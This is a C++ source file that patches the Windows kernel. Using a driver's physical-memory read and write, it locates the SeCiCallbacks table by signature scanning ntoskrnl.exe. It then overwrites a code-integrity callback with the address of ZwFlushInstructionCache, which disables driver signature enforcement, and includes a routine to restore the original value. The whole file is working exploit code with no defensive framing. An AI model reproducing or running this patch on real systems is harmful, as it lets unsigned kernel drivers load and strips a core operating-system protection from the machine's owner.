#include "stdafx.h"
#include "str_enc.h"
#include "sf/superfetch.h"
#include "ModuleUtils.hpp"
#include "sig_scan.hpp"
#include "driver_comm.hpp"
#include "driver_utils.hpp"
#include <iostream>

static uint64_t g_origCi = 0;
static uint64_t g_ciPhys = 0;
static uint64_t g_zwPhys = 0;
static bool g_patched = false;

bool CiPatchSeCiCallbacks(){
    if(!OpenDriverDevice()){
        return false;
    }
    uint64_t off_Zw = 0, off_Ci = 0;
    bool sigOk = SigScan::ResolveOffsetsBySignature(L"C:\\Windows\\System32\\ntoskrnl.exe", off_Ci, off_Zw);
    if(!sigOk) return false;

    if(!DriverUtils::EnablePrivilege(20)){} // SeDebug

    auto mm = spf::memory_map::current();
    if(!mm) return false;

    uint64_t ntosBase=0; ULONG ntosSize=0;
    if(!ModuleUtil::GetKernelModuleAddress("ntoskrnl.exe", ntosBase, ntosSize)) return false;

    void const* zwVirt = (void*)(ntosBase + off_Zw);
    void const* ciVirt = (void*)(ntosBase + off_Ci + 0x20);
    uint64_t zwPhys = mm->translate(zwVirt);
    uint64_t ciPhys = mm->translate(ciVirt);
    if(!zwPhys || !ciPhys) return false;

    uint64_t cidata=0;
    if(!ReadPhysMemory(g_hDevice, ciPhys, &cidata, sizeof(cidata))) return false;
    g_origCi = cidata;
    g_ciPhys = ciPhys;
    g_zwPhys = (uint64_t)zwVirt;

    // patch: write ZwFlushInstructionCache VA into SeCiCallbacks entry
    if(!WritePhysMemory(g_hDevice, ciPhys, &g_zwPhys, sizeof(g_zwPhys))) return false;
    g_patched = true;
    return true;
}
bool CiRestoreSeCiCallbacks(){
    if(!g_patched || !g_ciPhys) return false;
    bool ok = WritePhysMemory(g_hDevice, g_ciPhys, &g_origCi, sizeof(g_origCi));
    if(g_hDevice){ CloseHandle(g_hDevice); g_hDevice=nullptr; }
    g_patched=false;
    return ok;
}
